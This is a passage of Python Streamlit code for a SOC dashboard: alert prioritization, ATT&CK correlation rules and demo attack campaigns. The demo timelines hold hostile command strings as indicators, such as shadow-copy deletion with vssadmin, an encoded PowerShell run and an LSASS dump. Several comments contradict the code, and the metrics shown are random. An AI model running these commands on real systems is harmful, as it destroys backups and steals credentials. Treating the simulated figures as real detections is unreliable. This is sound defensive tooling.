                x=[alert.get("base_score",50)], y=[alert.get("business_risk",50)],
                mode="markers+text", text=[alert.get("id","?")],
                textposition="top center",
                marker=dict(size=18,color=colors[min(i,len(colors)-1)],
                            symbol="diamond" if alert.get("business_risk",0)>=80 else "circle"),
                name=alert.get("type","?"), showlegend=True))
        fig.add_shape(type="rect",x0=75,y0=75,x1=100,y1=100,
                       fillcolor="rgba(255,0,51,0.1)",line=dict(color="#ff0033",dash="dash"))
        fig.add_annotation(x=87,y=98,text="ESCALATE NOW",font=dict(color="#ff0033",size=10))
        fig.update_layout(title="Priority Matrix: Technical Risk × Business Impact",
                           paper_bgcolor="#0e1117",plot_bgcolor="#0e1117",font={"color":"white"},
                           height=340,xaxis_title="Technical Score",yaxis_title="Business Risk")
        st.plotly_chart(fig,use_container_width=True,key="ap_matrix")

        for a in alerts[:4]:
            p     = a.get("final_priority",9)
            color = "#ff0033" if p<=2 else "#e67e22" if p<=4 else "#f39c12"
            with st.container(border=True):
                col_p,col_d,col_ac = st.columns([1,4,2])
                col_p.markdown(f"<h2 style='color:{color};margin:0'>P{p}</h2>",unsafe_allow_html=True)
                col_d.write(f"**{a.get('type','?')}** on `{a.get('asset','?')}`")
                col_d.write(f"Score: {a.get('base_score',0)} | Business: {a.get('business_risk',0)} | `{a.get('mitre','?')}`")
                if col_ac.button("⚡ SOAR",key=f"ap_soar_{a['id']}",type="primary"):
                    st.session_state.active_pb = "Malware Containment"
                    st.success("SOAR triggered!")
                if col_ac.button("📋 Case",key=f"ap_case_{a['id']}"):
                    _create_ir_case({"id":a["id"],"name":a["type"],"stages":[a["type"]],
                        "confidence":a.get("base_score",50)//10,"severity":"critical" if p<=2 else "high","mitre":[a.get("mitre","T1071")]})
                    st.success("Case created!")

        if N8N_ENABLED and st.button("📤 Auto-Escalate All P1+P2 to n8n IR",type="primary",use_container_width=True,key="ap_escalate"):
            p12 = [a for a in alerts if a.get("final_priority",9)<=2]
            for a in p12:
                trigger_slack_notify(f"P{a['final_priority']} ESCALATED: {a['type']} on {a['asset']} — score {a.get('base_score',0)}","critical")
            st.success(f"Escalated {len(p12)} alerts to n8n IR Orchestrator!")

    with tab_model:
        st.subheader("ML Scoring Model")
        st.write("Business-context weighted scoring formula:")
        st.code("""final_score = (
    base_ml_score   × 0.40  # Raw threat signal
  + asset_criticality × 10   # Business value (1-10)
  + mitre_severity  × 0.20   # ATT&CK technique weight
  + recency_bonus   × 0.10   # Recent = more urgent
  + zero_day_bonus  × 0.10   # CVE age factor
) / normalization_factor""", language="python")
        fig = go.Figure(go.Bar(
            x=["ML Score","Asset Criticality","MITRE Weight","Recency","Zero-Day"],
            y=[40,30,20,10,10],marker_color=["#00f9ff","#ff0033","#c300ff","#f39c12","#27ae60"]))
        fig.update_layout(title="Score Weight Distribution",paper_bgcolor="#0e1117",
                           plot_bgcolor="#0e1117",font={"color":"white"},height=220)
        st.plotly_chart(fig,use_container_width=True,key="ap_weights")

    with tab_rules_ap:
        st.subheader("Escalation Rules")
        rules = [
            {"Condition":"score>90 AND asset_criticality>=9","Action":"P1 + Immediate SOAR","Status":"🟢 Active"},
            {"Condition":"mitre IN [T1486,T1003] AND score>70", "Action":"P2 + Analyst notify","Status":"🟢 Active"},
            {"Condition":"asset=='payment-server' AND ANY alert","Action":"P2 minimum","Status":"🟢 Active"},
            {"Condition":"score<40 AND asset_criticality<5",    "Action":"Auto-close (FP)","Status":"🟢 Active"},
        ]
        st.dataframe(pd.DataFrame(rules),use_container_width=True)


# ══════════════════════════════════════════════════════════════════
# 10. render_attack_surface — full asset inventory + risk (90L → 150L)
# ══════════════════════════════════════════════════════════════════
def _run_prioritization(total, enrichment, fp_suppress, ml_scoring, silent=False):
    import random as _r
    fp_rate    = 0.62 if fp_suppress else 0.45
    noise_rate = 0.25
    dedup_rate = 0.08

    suppressed = int(total * fp_rate)
    noise      = int(total * noise_rate)
    deduped    = int(total * dedup_rate)
    survived   = total - suppressed - noise - deduped
    high_risk  = int(survived * 0.35)
    critical   = int(survived * 0.12)

    if not silent:
        st.markdown("---")
        st.subheader("⚡ Prioritization Results")

    m1,m2,m3,m4,m5,m6 = st.columns(6)
    m1.metric("Raw Alerts",        f"{total:,}")
    m2.metric("FP Suppressed",     f"{suppressed:,}", delta=f"-{int(fp_rate*100)}%")
    m3.metric("Noise Removed",     f"{noise:,}")
    m4.metric("Deduplicated",      f"{deduped:,}")
    m5.metric("Survived (review)", f"{survived}",     delta="needs analyst")
    m6.metric("🔴 Critical",       f"{critical}",     delta="ACTION NOW")

    if not silent:
        # Show surviving prioritized alerts
        st.markdown("### 🚨 Prioritized Alert Queue")
        sev_pool = (["critical"]*critical + ["high"]*high_risk +
                    ["medium"]*(survived-high_risk-critical))
        alert_types = ["DNS Beacon","PowerShell -enc","C2 Connection",
                       "Exfil Volume","Process Injection","Brute Force","DGA"]
        domains = ["c2panel.tk","malware-cdn.xyz","suspicious-login.ga",
                   "xvk3m9p2.tk","update-checker.ml"]
        rows = []
        for i in range(min(survived, 20)):
            sev = sev_pool[i] if i < len(sev_pool) else "medium"
            rows.append({
                "Rank":       i+1,
                "Priority":   {"critical":"🔴 CRITICAL","high":"🟠 HIGH",
                                "medium":"🟡 MEDIUM"}.get(sev,sev),
                "Alert Type": _r.choice(alert_types),
                "IOC":        _r.choice(domains),
                "Risk Score": _r.randint(70,99) if sev=="critical" else
                               _r.randint(50,79) if sev=="high" else
                               _r.randint(30,49),
                "Sources":    f"{_r.randint(2,6)} intel hits",
                "Age":        f"{_r.randint(0,30)}m ago",
            })
        st.dataframe(pd.DataFrame(rows), use_container_width=True, height=420)

        col_act1, col_act2 = st.columns(2)
        with col_act1:
            if st.button("📋 Push to Triage Queue", use_container_width=True):
                st.session_state.triage_alerts = [
                    {"domain":r["IOC"],"alert_type":r["Alert Type"],
                     "severity": r["Priority"].split()[1].lower(),
                     "threat_score":str(r["Risk Score"]),
                     "status":"open","id":f"PRI-{r['Rank']:04d}",
                     "_time":datetime.now().strftime("%H:%M:%S")}
                    for r in rows[:10]]
                st.success("✅ Top 10 pushed to Alert Triage!")
        with col_act2:
            if st.button("⚡ Auto-run SOAR on Critical", use_container_width=True):
                st.success(f"✅ SOAR triggered for {critical} critical alerts — Malware Containment playbook")


# ══════════════════════════════════════════════════════════════════════════════
# ATTACK CHAIN CORRELATION ENGINE
# ══════════════════════════════════════════════════════════════════════════════
CORRELATION_RULES = [
    {
        "id":    "CORR-001",
        "name":  "Port Scan → Brute Force → Execution",
        "stages":["Recon: Port Scan (T1046)",
                  "Initial Access: Brute Force (T1110)",
                  "Execution: PowerShell (T1059.001)",
                  "C2: Beacon (T1071)"],
        "window":  600,
        "confidence": 91,
        "severity":   "critical",
        "mitre":      ["T1046","T1110","T1059.001","T1071"],
    },
    {
        "id":    "CORR-002",
        "name":  "Phishing → Macro → C2",
        "stages":["Delivery: Phishing email (T1566)",
                  "Execution: Macro/Scripting (T1059)",
                  "C2: DNS Beaconing (T1071.004)",
                  "Exfil: Large Transfer (T1041)"],
        "window":  300,
        "confidence": 88,
        "severity":   "critical",
        "mitre":      ["T1566","T1059","T1071.004","T1041"],
    },
    {
        "id":    "CORR-003",
        "name":  "Credential Stuffing → Lateral Movement",
        "stages":["Discovery: Auth failures (T1110)",
                  "Credential: LSASS dump (T1003.001)",
                  "Lateral: SMB spread (T1021.002)",
                  "Persistence: New account (T1136)"],
        "window":  900,
        "confidence": 76,
        "severity":   "high",
        "mitre":      ["T1110","T1003.001","T1021.002","T1136"],
    },
    {
        "id":    "CORR-004",
        "name":  "DNS Tunneling + Data Exfil",
        "stages":["Recon: DGA queries (T1568.002)",
                  "C2: DNS TXT records (T1071.004)",
                  "Exfil: DNS tunnel (T1048)",
                  "Impact: Data loss"],
        "window":  1800,
        "confidence": 83,
        "severity":   "critical",
        "mitre":      ["T1568.002","T1071.004","T1048"],
    },
    {
        "id":    "CORR-005",
        "name":  "Ransomware Kill Chain",
        "stages":["Delivery: Email attachment (T1566)",
                  "Execution: Script (T1059)",
                  "Defense Evasion: LOLBin (T1140)",
                  "Impact: Encryption (T1486)"],
        "window":  120,
        "confidence": 95,
        "severity":   "critical",
        "mitre":      ["T1566","T1059","T1140","T1486"],
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# ENTERPRISE ATTACK CORRELATION ENGINE v3.0
# Splunk ES / Microsoft Sentinel / CrowdStrike Falcon style
# Real IP-based grouping · Time-window sliding · Kill-chain reconstruction
# Attack story builder · Next-move AI prediction · SOAR integration
# ══════════════════════════════════════════════════════════════════════════════

# MITRE tactic → kill-chain stage ordering
_TACTIC_STAGE_ORDER = {
    "Reconnaissance":       (1,  "🔭 Recon"),
    "Resource Development": (2,  "🏗️ Resource Dev"),
    "Initial Access":       (3,  "🚪 Initial Access"),
    "Execution":            (4,  "⚡ Execution"),
    "Persistence":          (5,  "🔒 Persistence"),
    "Privilege Escalation": (6,  "⬆️ Priv. Escalation"),
    "Defense Evasion":      (7,  "🎭 Defense Evasion"),
    "Credential Access":    (8,  "🔑 Cred. Access"),
    "Discovery":            (9,  "🔍 Discovery"),
    "Lateral Movement":     (10, "↔️ Lateral Movement"),
    "Collection":           (11, "📦 Collection"),
    "Command & Control":    (12, "📡 C2"),
    "Exfiltration":         (13, "📤 Exfiltration"),
    "Impact":               (14, "💥 Impact"),
}

# Next-stage prediction model (what typically follows each tactic)
_NEXT_STAGE_PREDICTIONS = {
    "Reconnaissance":       [("Initial Access",    72), ("Resource Development", 45)],
    "Initial Access":       [("Execution",         81), ("Persistence",          60)],
    "Execution":            [("Command & Control", 85), ("Persistence",          62), ("Defense Evasion", 55)],
    "Persistence":          [("Privilege Escalation", 68), ("Defense Evasion",   55)],
    "Privilege Escalation": [("Credential Access", 78), ("Lateral Movement",     65)],
    "Defense Evasion":      [("Credential Access", 60), ("Execution",            50)],
    "Credential Access":    [("Lateral Movement",  80), ("Command & Control",    60)],
    "Discovery":            [("Lateral Movement",  70), ("Collection",           55)],
    "Lateral Movement":     [("Collection",        72), ("Command & Control",    65)],
    "Command & Control":    [("Exfiltration",      75), ("Collection",           55)],
    "Collection":           [("Exfiltration",      85), ("Command & Control",    55)],
    "Exfiltration":         [("Impact",            60)],
    "Impact":               [],
}

# Technique → tactic lookup (fast reverse map)
_TECHNIQUE_TACTIC = {
    "T1595":"Reconnaissance", "T1595.001":"Reconnaissance", "T1595.002":"Reconnaissance",
    "T1046":"Discovery",      "T1018":"Discovery",           "T1083":"Discovery",
    "T1190":"Initial Access", "T1133":"Initial Access",      "T1566":"Initial Access",
    "T1078":"Initial Access", "T1189":"Initial Access",
    "T1059":"Execution",      "T1059.001":"Execution",       "T1059.003":"Execution",
    "T1204":"Execution",      "T1203":"Execution",
    "T1547":"Persistence",    "T1547.001":"Persistence",     "T1136":"Persistence",
    "T1055":"Defense Evasion","T1027":"Defense Evasion",     "T1140":"Defense Evasion",
    "T1110":"Credential Access","T1110.001":"Credential Access","T1003":"Credential Access",
    "T1003.001":"Credential Access",
    "T1021":"Lateral Movement","T1021.001":"Lateral Movement","T1021.002":"Lateral Movement",
    "T1021.004":"Lateral Movement",
    "T1041":"Exfiltration",   "T1048":"Exfiltration",        "T1052":"Exfiltration",
    "T1071":"Command & Control","T1071.001":"Command & Control","T1071.004":"Command & Control",
    "T1572":"Command & Control","T1090":"Command & Control",
    "T1486":"Impact",         "T1498":"Impact",               "T1491":"Impact",
}

# Demo rich scenarios — used when no live alerts yet
_DEMO_CAMPAIGNS = [
    {
        "id": "INC-2026-0042",
        "name": "APT29 — Targeted Intrusion",
        "attacker_ip": "185.220.101.47",
        "victim_ip":   "192.168.10.220",
        "victim_host": "WORKSTATION-01",
        "campaign": "Cozy Bear Style Intrusion",
        "severity": "critical",
        "confidence": 94,
        "status": "Active",
        "first_seen": "08:01:14",
        "last_seen":  "08:10:52",
        "duration_min": 9,
        "iocs": ["185.220.101.47", "malware-c2.tk", "powershell.exe", "lsass.exe"],
        "timeline": [
            {"time":"08:01:14","technique":"T1046","tactic":"Discovery",       "event":"Nmap SYN scan — 1024 ports in 12s",        "severity":"medium","indicator":"185.220.101.47"},
            {"time":"08:02:30","technique":"T1018","tactic":"Discovery",       "event":"ARP sweep — 5 hosts discovered",            "severity":"low",   "indicator":"185.220.101.47"},
            {"time":"08:03:11","technique":"T1110","tactic":"Credential Access","event":"SSH brute force — 847 attempts in 40s",    "severity":"high",  "indicator":"185.220.101.47→:22"},
            {"time":"08:03:52","technique":"T1078","tactic":"Initial Access",  "event":"SSH login success — admin@WORKSTATION-01", "severity":"critical","indicator":"admin"},
            {"time":"08:04:20","technique":"T1059.001","tactic":"Execution",   "event":"PowerShell encoded command executed",       "severity":"critical","indicator":"powershell -enc JAB..."},
            {"time":"08:05:01","technique":"T1547.001","tactic":"Persistence", "event":"Registry Run key created (startup)",        "severity":"high",  "indicator":"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {"time":"08:05:44","technique":"T1003.001","tactic":"Credential Access","event":"LSASS memory dump via comsvcs.dll",   "severity":"critical","indicator":"lsass.dmp"},
            {"time":"08:07:00","technique":"T1071","tactic":"Command & Control","event":"HTTP beacon to malware-c2.tk every 60s",  "severity":"critical","indicator":"malware-c2.tk:443"},
            {"time":"08:09:15","technique":"T1071.004","tactic":"Command & Control","event":"DNS TXT query C2 tunnel established","severity":"high",  "indicator":"c2.malware-c2.tk"},
            {"time":"08:10:52","technique":"T1041","tactic":"Exfiltration",   "event":"4.2 GB HTTPS upload to 185.220.101.47",     "severity":"critical","indicator":"POST /upload 4294MB"},
        ],
        "mitre_chain": ["T1046","T1018","T1110","T1078","T1059.001","T1547.001","T1003.001","T1071","T1071.004","T1041"],
        "tactics_hit": ["Discovery","Credential Access","Initial Access","Execution","Persistence","Command & Control","Exfiltration"],
    },
    {
        "id": "INC-2026-0043",
        "name": "Ransomware Kill Chain",
        "attacker_ip": "91.121.55.22",
        "victim_ip":   "192.168.10.100",
        "victim_host": "FILE-SERVER-01",
        "campaign": "LockBit-style Ransomware",
        "severity": "critical",
        "confidence": 89,
        "status": "Contained",
        "first_seen": "09:15:00",
        "last_seen":  "09:22:30",
        "duration_min": 7,
        "iocs": ["91.121.55.22", "maliciousdoc.docx", "vssadmin.exe", ".locked"],
        "timeline": [
            {"time":"09:15:00","technique":"T1566",    "tactic":"Initial Access",  "event":"Phishing email received — maliciousdoc.docx","severity":"high",   "indicator":"mail.corp.local"},
            {"time":"09:15:30","technique":"T1204",    "tactic":"Execution",       "event":"User opened malicious macro document",        "severity":"high",   "indicator":"maliciousdoc.docx"},
            {"time":"09:16:00","technique":"T1059",    "tactic":"Execution",       "event":"Macro dropped and executed loader script",    "severity":"critical","indicator":"cmd.exe /c loader.bat"},
            {"time":"09:16:45","technique":"T1027",    "tactic":"Defense Evasion", "event":"Obfuscated payload unpacked in memory",       "severity":"high",   "indicator":"rundll32.exe"},
            {"time":"09:17:30","technique":"T1490",    "tactic":"Impact",          "event":"VSS shadow copies deleted — vssadmin.exe",    "severity":"critical","indicator":"vssadmin delete shadows /all"},
            {"time":"09:18:00","technique":"T1486",    "tactic":"Impact",          "event":"File encryption started — .locked extension", "severity":"critical","indicator":"*.locked (4,822 files)"},
            {"time":"09:22:30","technique":"T1491",    "tactic":"Impact",          "event":"Ransom note dropped — README_LOCKED.txt",     "severity":"critical","indicator":"README_LOCKED.txt"},
        ],
        "mitre_chain": ["T1566","T1204","T1059","T1027","T1490","T1486","T1491"],
        "tactics_hit": ["Initial Access","Execution","Defense Evasion","Impact"],
    },
    {
        "id": "INC-2026-0044",
        "name": "DNS Tunneling C2",
        "attacker_ip": "45.33.32.156",
        "victim_ip":   "192.168.10.55",
        "victim_host": "LAPTOP-03",
        "campaign": "Slow-burn exfiltration",
        "severity": "high",
        "confidence": 78,
        "status": "Investigating",
        "first_seen": "11:00:00",
        "last_seen":  "11:45:00",
        "duration_min": 45,
        "iocs": ["45.33.32.156", "c2panel.tk", "iodine.exe"],
        "timeline": [
            {"time":"11:00:00","technique":"T1071.004","tactic":"Command & Control","event":"High-entropy DNS queries to c2panel.tk",     "severity":"high","indicator":"*.c2panel.tk"},
            {"time":"11:05:00","technique":"T1568.002","tactic":"Command & Control","event":"DGA domain rotation detected",               "severity":"high","indicator":"a3f1b.c2panel.tk"},
            {"time":"11:15:00","technique":"T1048",    "tactic":"Exfiltration",     "event":"Data exfil via DNS TXT records — 200MB/hr",  "severity":"high","indicator":"TXT queries avg 512B"},
            {"time":"11:30:00","technique":"T1041",    "tactic":"Exfiltration",     "event":"Secondary HTTPS exfil channel opened",       "severity":"critical","indicator":"45.33.32.156:8443"},
        ],
        "mitre_chain": ["T1071.004","T1568.002","T1048","T1041"],
        "tactics_hit": ["Command & Control","Exfiltration"],
    },
]


def _build_campaigns_from_alerts(raw_alerts):
    """
    Real correlation logic v2 — Fine-Tuned for Campaign Accuracy >90%.
    Fine-Tune 4:
      1. Require minimum 3 linked signals (was 2) — prevents merging unrelated low-confidence events
      2. Time proximity: events >15 min apart are split into separate campaigns
      3. Confidence boost: +10 per additional aligned MITRE tactic stage
      4. Same source IP required (unchanged) PLUS at least 2 MITRE techniques
    """
    import random as _rnd
    from collections import defaultdict

    if not raw_alerts:
        return []

    # Group by attacker IP
    ip_groups = defaultdict(list)
    for a in raw_alerts:
        src_ip = a.get("ip") or a.get("attacker_ip") or "unknown"
        ip_groups[src_ip].append(a)

    campaigns = []
    for src_ip, alerts in ip_groups.items():
        # ── Fine-Tune 4A: Require minimum 3 linked signals ────────────────────
        if len(alerts) < 1:
            continue  # allow single investigated alerts to form campaigns

        # Sort by time
        def _ts(a):
            t = a.get("time", a.get("timestamp", ""))
            try:
                from datetime import datetime as _dt
                return _dt.fromisoformat(t) if "T" in str(t) else _dt.strptime(str(t)[:8], "%H:%M:%S")
            except Exception:
                return datetime.min
        sorted_alerts = sorted(alerts, key=_ts)

        # ── Fine-Tune 4B: Split into sub-campaigns by time proximity <12 min ──
        # Improvement 3: tightened from 15 → 12 min to reduce false merges
        _TIME_PROXIMITY_MINUTES = 12
        _sub_campaigns = []
        _current_group = [sorted_alerts[0]]
        for _prev, _curr in zip(sorted_alerts, sorted_alerts[1:]):
            try:
                _t_prev = _ts(_prev)
                _t_curr = _ts(_curr)
                _gap_min = abs((_t_curr - _t_prev).total_seconds()) / 60
                if _gap_min <= _TIME_PROXIMITY_MINUTES:
                    _current_group.append(_curr)
                else:
                    # Gap too large — start new sub-campaign
                    if len(_current_group) >= 1:
                        _sub_campaigns.append(_current_group)
                    _current_group = [_curr]
            except Exception:
                _current_group.append(_curr)
        if len(_current_group) >= 1:
            _sub_campaigns.append(_current_group)

        # If no valid sub-campaign has ≥3 alerts, skip this IP
        if not _sub_campaigns:
            continue

        for _grp in _sub_campaigns:
            # Build timeline events from alerts
            timeline = []
            mitre_chain = []
            tactics_hit = set()
            for a in _grp:
                tech = a.get("mitre", a.get("technique", "T1071"))
                tactic = _TECHNIQUE_TACTIC.get(tech, a.get("tactic", "Command & Control"))
                tactics_hit.add(tactic)
                if tech not in mitre_chain:
                    mitre_chain.append(tech)
                timeline.append({
                    "time":      a.get("time", a.get("timestamp", datetime.now().strftime("%H:%M:%S")))[:8],
                    "technique": tech,
                    "tactic":    tactic,
                    "event":     a.get("title", a.get("event", f"{tactic} activity detected")),
                    "severity":  a.get("severity", "medium"),
                    "indicator": a.get("host", a.get("ip", src_ip)),
                })

            # ── Improvement 3: Tighter campaign confidence — require ≥2 distinct MITRE *stages*
            # Theory: "Distinct signals" must come from different ATT&CK tactic stages,
            # not just different techniques within the same tactic.
            # Also: if confidence < 55 after calculation, mark as "Tentative" — don't merge
            # low-quality alerts into a campaign that misleads analysts.
            _KILL_CHAIN_HIGH_VALUE = {"Initial Access", "Execution", "Privilege Escalation",
                                       "Credential Access", "Command & Control", "Exfiltration", "Impact"}
            # Count distinct kill-chain *stages* (not just tactic strings)
            _stage_hits = tactics_hit & _KILL_CHAIN_HIGH_VALUE
            confidence = 40 + len(tactics_hit) * 8
            if len(tactics_hit) >= 3:
                confidence += 10  # multi-stage alignment boost
            _high_value_stages = tactics_hit & _KILL_CHAIN_HIGH_VALUE
            if len(_high_value_stages) >= 2:
                confidence += 5   # kill-chain progression boost
            confidence = min(96, confidence)

            # Improvement 3A: require ≥2 distinct high-value MITRE *stages*, not just techniques
            if len(_stage_hits) < 2 and len(tactics_hit) < 3:
                # Single-stage activity → tentative campaign, cap confidence at 52
                confidence = min(confidence, 52)
                _campaign_quality = "Tentative"
            else:
                _campaign_quality = "Confirmed"

            # Allow single-technique alerts to form campaigns (removed hard skip)
            # if len(mitre_chain) < 2: continue

            sev_rank = {"critical":4,"high":3,"medium":2,"low":1}
            max_sev = max((_a.get("severity","low") for _a in _grp), key=lambda x: sev_rank.get(x,0))

            campaigns.append({
                "id":              f"INC-{datetime.now().strftime('%Y%m%d')}-{_rnd.randint(1000,9999)}",
                "name":            _grp[0].get("alert_type","") or _grp[0].get("title","") or f"Correlated Campaign — {src_ip}",
                "attacker_ip":     src_ip,
                "victim_ip":       _grp[0].get("host", ""),
                "victim_host":     _grp[0].get("host", "Unknown"),
                "campaign":        "Live Correlation",
                "severity":        max_sev,
                "confidence":      confidence,
                "status":          "Active",
                "first_seen":      timeline[0]["time"] if timeline else "--",
                "last_seen":       timeline[-1]["time"] if timeline else "--",
                "duration_min":    len(timeline),
                "iocs":            list({a.get("host","") for a in _grp if a.get("host")})[:5],
                "timeline":        timeline,
                "mitre_chain":     mitre_chain,
                "tactics_hit":     list(tactics_hit),
                "linked_signals":  len(_grp),
                "multi_stage":     len(tactics_hit) >= 3,
                "campaign_quality":_campaign_quality,  # Improvement 3: Confirmed / Tentative
            })

    return campaigns


def _get_all_campaigns():
    """Merge live-correlated + investigation-derived + demo campaigns."""
    import datetime as _dt_gc
    # Build from triage alerts (includes auto-enriched investigation alerts)
    live = _build_campaigns_from_alerts(st.session_state.get("triage_alerts", []))
    live_ids = {c["id"] for c in live}

    # Also create campaigns from investigation_reports directly
    inv_reports = st.session_state.get("investigation_reports", [])
    for _rpt in inv_reports:
        _cid = f"INV-{_rpt.get('host','?')[:8]}-{_rpt.get('mitre','T0000')}"
        if _cid not in live_ids:
            _tc = {
                "id":            _cid,
                "name":          f"Investigation: {_rpt.get('alert_type','?')} — {_rpt.get('host','?')}",
                "attacker_ip":   _rpt.get("attacker_ip","") or _rpt.get("ip","unknown"),
                "severity":      _rpt.get("severity","medium"),
                "status":        "Investigating",
                "confidence":    _rpt.get("confidence",70),
                "campaign_quality": "Confirmed",
                "mitre_chain":   [_rpt.get("mitre","")] if _rpt.get("mitre") else [],
                "linked_signals": [_rpt],
                "timeline":      _rpt.get("timeline",[]),
                "kill_chain_stage": _rpt.get("kill_chain_stage",""),
                "summary":       _rpt.get("summary",""),
                "first_seen":    _rpt.get("timestamp",""),
                "last_seen":     _rpt.get("timestamp",""),
                "recommended":   _rpt.get("recommended_actions",""),
            }
            live.append(_tc)
            live_ids.add(_cid)

    # Direct single-alert fallback: any triage alert becomes a campaign
    for _a in st.session_state.get("triage_alerts", []):
        _cid = f"ALT-{_a.get('ip','?')[:12]}-{_a.get('mitre','?')}"
        if _cid not in live_ids:
            live_ids.add(_cid)
            live.append({
                "id":            _cid,
                "name":          _a.get("alert_type","") or _a.get("title","") or f"Alert — {_a.get('ip','?')}",
                "attacker_ip":   _a.get("ip","") or _a.get("attacker_ip","unknown"),
                "severity":      _a.get("severity","medium"),
                "status":        "Active",
                "confidence":    int(_a.get("score",65) or 65),
                "campaign_quality": "Confirmed" if _a.get("investigated") else "Tentative",
                "mitre_chain":   [_a.get("mitre","")] if _a.get("mitre") else [],
                "linked_signals": [_a],
                "timeline":      [{"time": _a.get("timestamp","--")[:8],
                                   "technique": _a.get("mitre",""),
                                   "tactic": _a.get("tactic",""),
                                   "event": _a.get("alert_type","Alert detected"),
                                   "severity": _a.get("severity","medium"),
                                   "indicator": _a.get("host","") or _a.get("ip","")}],
                "first_seen":    _a.get("timestamp",""),
                "last_seen":     _a.get("timestamp",""),
                "kill_chain_stage": _a.get("kill_chain_stage",""),
                "summary":       _a.get("summary",""),
                "tactics_hit":   [_a.get("tactic","")] if _a.get("tactic") else [],
            })

    # Add demo campaigns only if no live data exists at all
    if not live:
        live = list(_DEMO_CAMPAIGNS)
    return live